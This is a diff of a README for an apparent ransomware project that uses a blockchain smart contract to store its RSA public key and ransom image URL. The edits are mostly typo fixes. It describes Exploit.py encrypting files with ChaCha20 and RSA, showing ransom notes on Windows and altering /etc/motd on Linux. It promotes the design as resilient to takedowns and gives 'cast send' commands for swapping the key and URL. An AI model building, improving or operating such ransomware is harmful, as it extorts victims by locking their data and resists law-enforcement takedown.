@@ -10,51 +10,51 @@
 
 ---
 
-## 🎓 Overview ##
+## 🎓 Overview
 
 <img src="https://github.com/cM4rko/decentralized-ransomware/blob/main/assets/images/image.png" >
 
 ---
 
-## 🌐 Decentralized Architecture ##
+## 🌐 Decentralized Architecture
 
-- `Contract.sol` -> The Smart Contract deployed on any EVM compatible Blockchain with de function that stores the public RSA and the image URL.
+- `Contract.sol` -> The Smart Contract deployed on any EVM-compatible Blockchain with the function that stores the public RSA key and the image URL.
   
-- `Exploit.py` -> The Python script that calls the contract to retrieve the public RSA, encrypts all non-sensible files with ChaCha20 and encrypts the ChaCha20 key with the public RSA.
+- `Exploit.py` -> The Python script that calls the contract to retrieve the public RSA key, encrypts all non-sensitive files with ChaCha20, and encrypts the ChaCha20 key with the public RSA key.
 
 ---
 
-## 🔝 Blockchain Improvments  ##
+## 🔝 Blockchain Improvements
 
 - Resilient to:
   - Censorship
   - Takedowns
   - Shutdowns
 
-- Posibility to change the public RSA key at any moment and the image URL
-- Only the contract Owner can change the payload stored in the contract
-
+- Possibility to change the public RSA key and the image URL at any moment.
+- Only the contract Owner can change the payload stored in the contract.
 
 ---
-## 🧬 Exploit Variations ##
+
+## 🧬 Exploit Variations
 
 **[+] Windows**
-  - The exploit pops up the RANSOM-NOTE.txt with notepad.exe
-  - The exploit changes the desktop background to the image at the URL
+  - The exploit opens RANSOM-NOTE.txt using notepad.exe.
+  - The exploit changes the desktop background to the image at the URL.
 
 **[+] Linux**
-  - The exploit tryes to change the file motd in /etc/motd
-
+  - The exploit tries to change the MOTD file in `/etc/motd`.
 
 ---
-## ⚙️ Snippets ##
 
-** Change Public RSA **
+## ⚙️ Snippets
+
+**Change Public RSA**
 ```bash
 cast send $CONTRACT_ADDRESS "changeKey(bytes)" $HEX_RSA --rpc-url $NODE --private-key $KEY
 ```
 
-**To change the image URL**
+**Change Image URL**
 ```bash
 cast send $CONTRACT_ADDRESS "changeUrl(string)" $NEW_URL --rpc-url $NODE --private-key $PRIVATE_KEY
 ```
